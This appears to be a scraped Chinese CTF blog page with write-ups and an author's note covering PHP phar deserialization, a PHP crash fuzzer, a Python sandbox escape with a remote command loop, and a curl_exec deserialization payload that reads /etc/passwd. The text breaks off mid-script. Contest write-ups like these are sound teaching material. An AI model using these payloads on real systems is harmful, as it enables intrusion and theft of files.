<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filepath</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$filepath</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filepath = <span class="variable">$filepath</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;checker))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;upload_file();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">view_detail</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filepath))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;nonono~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$mine</span> = mime_content_type(<span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$store_path</span> = <span class="keyword">$this</span>-&gt;open(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;filepath);</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;mine&#x27;</span>] = <span class="variable">$mine</span>;</span><br><span class="line">        <span class="variable">$res</span>[<span class="string">&#x27;store_path&#x27;</span>] = <span class="variable">$store_path</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤phar并且明明没有给<code>$checker</code>赋值的点,在销毁的时候却会调用它,明显是一个为了出题而写的地方猜测phar反序列化利用,而mime_content_type()恰好又是反序列化的利用点</p>
<p>最后在view.php处找到调用view_detail的地方</p>
<p>由于题目不限制.php文件的上传,但是题目会写一个非法.htaccess</p>
<p>所以我们可以可以试着删除它</p>
<p>构造pop链:</p>
<p><code>FILE::view_detail(mime_content_type)-&gt;FILE::__destruct(upload_file())-&gt;Profile::__call(open())-&gt;ZipArchive::open(file,ZipArchive::OVERWRITE)</code></p>
<p>phar文件生成后就是要考虑如何绕过<code>(^phar)</code>的限制,</p>
<p>我觉得这才是这一题最骚的地方:</p>
<p><code>filepath=php://filter/resource=phar://sandbox/a87136ce5a8b85871f1d0b6b2add38d2/dd7ec931179c4dcb6a8ffb8b8786d20b.txt</code></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>这次最开心的就是做misc的题目</p>
<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><h3 id="betgame"><a href="#betgame" class="headerlink" title="betgame"></a>betgame</h3><p>发现猜拳规律</p>
<p>计算机第一次出与被显示的选择克制的选择(显示:s,实际出:j)</p>
<p>计算机第二次出与克制显示的选择的选择(显示:s,实际出:b)</p>
<p>计算机第三次出显示的选择(显示:s,实际出:s)</p>
<p>然后手动pk :D</p>
<h3 id="jigsaw"><a href="#jigsaw" class="headerlink" title="jigsaw"></a><strong>jigsaw</strong></h3><p><img src="https://i.loli.net/2019/09/09/eDQhxkWYUsvZdVa.png" alt="image.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/bytectfwp/" data-id="cku8j3fh4003hdan7aoss9kbp" data-title="bytectf wp" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ciscn2020easyphp出题笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.672Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">ciscn2020easyphp出题笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="easyphp出题笔记"><a href="#easyphp出题笔记" class="headerlink" title="easyphp出题笔记"></a>easyphp出题笔记</h1><p>这题原意是想让大家写脚本来fuzz来发现CUFA/CUF中对引用处理不恰当而造成的崩溃，特意禁止了pcntl可是由于没有认真测试，忘记了还有CUF这个函数，结果有人直接绕过了。</p>
<p>出题人想干的事情就是我们不让他干成就是对这种情况的最好解释。最后看到自己的题目被解成那样，我也是自闭了。</p>
<p>继续正题吧。</p>
<h2 id="来由"><a href="#来由" class="headerlink" title="来由"></a>来由</h2><p>之所以会出现这题是因为前段时间的wmctf的webweb反序列化出有这样一处的利用点，我为了找到合适的函数就采取fuzz，东西没发现倒是发现php崩溃了。</p>
<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>直接去看<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=79979">bugs.php</a> 上面的，会不会是因为交到bugs.php上的原因导致这么多人解了？</p>
<h2 id="原解"><a href="#原解" class="headerlink" title="原解"></a>原解</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status))&#123;phpinfo();&#125;</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p>
<p>fork子进程执行的代码是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            call_user_func_array(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],[<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br></pre></td></tr></table></figure>

<p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$payloads</span>=[</span><br><span class="line">        <span class="string">&quot;ls&quot;</span>,<span class="comment">//shell命令执行测试</span></span><br><span class="line">        <span class="string">&quot;index.php&quot;</span>,<span class="comment">//读取文件测试</span></span><br><span class="line">        <span class="string">&quot;asdfasldfjaklsdfjl.php&quot;</span>,<span class="comment">//创建文件/文件夹测试</span></span><br><span class="line">        <span class="string">&quot;echo 123;&quot;</span><span class="comment">//php命令执行测试</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$str</span>=file_get_contents(<span class="string">&quot;fatalerr.log&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="string">&quot;[]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fatalerror</span>=<span class="keyword">eval</span>(<span class="string">&quot;return &quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_result</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$r</span>,<span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$r</span>==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$func</span>(<span class="subst">$v</span>,false,true) return value:&quot;</span>;</span><br><span class="line">            var_dump(<span class="variable">$r</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">brute_func</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$payloads</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$fatalerror</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$val</span>))&#123;</span><br><span class="line">                brute_func(<span class="variable">$val</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$val</span>,<span class="variable">$fatalerror</span>))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            array_push(<span class="variable">$fatalerror</span>,<span class="variable">$val</span>);</span><br><span class="line">            file_put_contents(<span class="string">&quot;fatalerr.log&quot;</span>,var_export(<span class="variable">$fatalerror</span>,<span class="literal">TRUE</span>));</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$payloads</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="variable">$r</span>=<span class="literal">NULL</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$r</span>=call_user_func_array(<span class="variable">$val</span>,[<span class="variable">$v</span>,<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">                show_result(<span class="variable">$val</span>,<span class="variable">$r</span>,<span class="variable">$v</span>);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            array_pop(<span class="variable">$fatalerror</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$arr</span>=get_defined_functions();</span><br><span class="line">    brute_func(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>多次执行发现：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_server</span><br><span class="line">exec</span><br><span class="line">stream_socket_client</span><br></pre></td></tr></table></figure>

<p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码，但是这里我禁用了exec所以我们用另外两个函数引起segment fault查看phpinfo，在phpinfo中找到flag。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>希望有师傅有不同的解可以留个言啥的谢谢啦</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" data-id="cku8j3fh5003ldan79zrbailh" data-title="ciscn2020easyphp出题笔记" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019xman个人排位赛wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.668Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xman个人排位赛wp</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="escape"><a href="#escape" class="headerlink" title="escape"></a>escape</h2><p>收获:了解了python沙箱逃逸这种类型</p>
<p>getattr:对沙箱逃逸有很大作用</p>
<p>list(s)获得字符集,可以用来绕过引号限制</p>
<p>试了一下system</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banned=  [<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;reload&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;const&#x27;</span>, <span class="string">&#x27;vars&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;format&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;translate&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;content&#x27;</span>, <span class="string">&#x27;frame&#x27;</span>, <span class="string">&#x27;back&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>发现引号和点都被过滤了,不过提示说</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">   os.system(<span class="string">&quot;echo hello&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>说明是可以通过调用system来完成,接下来就是想办法得到system函数了</p>
<p>而引号被过滤可以用字符串s里的值来绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#考虑这样来</span></span><br><span class="line">a=<span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">a(<span class="string">&quot;命令&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_str</span>(<span class="params">string</span>):</span></span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        result+=<span class="string">&#x27;table[&#x27;</span>+<span class="built_in">str</span>(table.index(i))+<span class="string">&#x27;]+&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> result[:-<span class="number">1</span>]</span><br><span class="line">conn=remote(<span class="string">&#x27;47.97.253.115&#x27;</span>,<span class="number">10005</span>)</span><br><span class="line">conn.sendline(<span class="string">&#x27;table=list(s)&#x27;</span>)</span><br><span class="line">conn.sendline(<span class="string">&#x27;sys=&#x27;</span>+get_str(<span class="string">&#x27;system&#x27;</span>))</span><br><span class="line">conn.sendline(<span class="string">&#x27;fun=getattr(os,sys)&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        command=<span class="built_in">input</span>(<span class="string">&#x27;(www):$&#x27;</span>)</span><br><span class="line">        new_com=<span class="string">&#x27;fun(&#x27;</span>+get_str(command)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        conn.sendline(new_com)</span><br><span class="line">        <span class="built_in">print</span>(conn.recvuntil(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>))</span><br><span class="line">conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>flag{4EEAA88DA0B3207862D2E4876AF84A3D}</p>
<h2 id="strange-ssid"><a href="#strange-ssid" class="headerlink" title="strange_ssid"></a>strange_ssid</h2><p>这题是结束听别人讲的</p>
<p>所有的数据都是32个字符</p>
<p>所以猜测是md5加密</p>
<p>找出符合md5格式的数据</p>
<p>68dffd5a1be838b5326209714f7ea7a5</p>
<p>解密后提交flag{n3k0}失败</p>
<p>直接提交flag{68dffd5a1be838b5326209714f7ea7a5}试试</p>
<p>成功</p>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a><strong>ezphp</strong></h2><p>收获:知道了curl_exec 本地文件读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$b</span> = strpos(<span class="keyword">$this</span>-&gt;a, <span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$b</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Bye!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$c</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$c</span>, CURLOPT_URL, <span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        curl_setopt(<span class="variable">$c</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$c</span>, CURLOPT_CONNECTTIMEOUT, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">echo</span> curl_exec(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;z&quot;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;z&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>curl_exec+反序列化</p>
<p>试了下本地文件读取</p>
<p>O:5:”Hello”:1:{s:1:”a”;s:27:”file://localhost/etc/passwd”;}</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwj7l0c4j30wp0ax407.jpg" alt="image1967"></p>
<p>题目过滤flag字符</p>
<p>说明我们flag就在flag文件里</p>
<p>谷歌看了好久，后来看一道又curl_exec的题目，获得了url二次编码的思路</p>
<p>最后的payload:</p>
<p><a target="_blank" rel="noopener" href="http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:%7Bs:1:%22a%22;s:23:%22file://localhost/%2566lag%22;%7D">http://47.97.253.115:10006/?z=O:5:%22Hello%22:1:{s:1:%22a%22;s:23:%22file://localhost/%2566lag%22;}</a></p>
<p>这里有一些坑就是:</p>
<ol>
<li><p>你不知道flag文件在哪个文件夹,结果最后就在根目录。。</p>
</li>
<li><p>因为是二次编码所以要注意字符串的长度</p>
</li>
</ol>
<h2 id="onion’s-secret"><a href="#onion’s-secret" class="headerlink" title="onion’s_secret"></a><strong>onion’s_secret</strong></h2><p>下载得到一个压缩包，常规的检查走一遍</p>
<p>发现onion.jpg文件尾后还有数据</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g5uwp2ulyrj30jj079dif.jpg" alt="image2357"></p>
<p>zip格式,get一个新的加密压缩包</p>
<p>密码在hint里有提示</p>
<p>接下来就是很普通的写python了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">burp</span>(<span class="params">filename,hint</span>):</span></span><br><span class="line">    password=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        password=hint.replace(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">chr</span>(i))</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(filename) <span class="keyword">as</span> myzip:</span><br><span class="line">            <span class="keyword">try</span> :</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;解密:&quot;</span>+filename+<span class="string">&quot;:&quot;</span>+password)</span><br><span class="line">                myzip.read(<span class="string">&#x27;onion.zip&#x27;</span>,pwd=<span class="built_in">bytes</span>(password,encoding=<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">return</span> password</span><br><span class="line">            <span class="keyword">except</span> RuntimeError: </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;解密失败&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                <span class="built_in">input</span>(<span class="string">&#x27;过来康康&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> zipfile.zlib.error:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;跳过&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">127</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;爆破失败&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;爆破成功&#x27;</span>+password)</span><br><span class="line">    <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writebyte</span>(<span class="params">bbyte,filename</span>):</span></span><br><span class="line">    f=<span class="built_in">open</span>(filename,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(bbyte)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readbyte</span>(<span class="params">filename</span>):</span></span><br><span class="line">    f=<span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">    bbyte=f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> bbyte</span><br><span class="line"></span><br><span class="line">nullbyte=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&#x27;temp.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    hint=f.read()[<span class="number">12</span>:]</span><br><span class="line">    f.close()</span><br><span class="line">    pwd=burp(<span class="string">&#x27;onion1.zip&#x27;</span>,hint)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(<span class="string">&#x27;onion1.zip&#x27;</span>) <span class="keyword">as</span> myzip:</span><br><span class="line">        <span class="built_in">str</span>=myzip.read(<span class="string">&#x27;onion.zip&#x27;</span>,pwd=<span class="built_in">bytes</span>(pwd,encoding=<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">        writebyte(<span class="built_in">str</span>,<span class="string">&quot;temp.zip&quot;</span>)</span><br><span class="line">        <span class="built_in">str</span>=myzip.read(<span 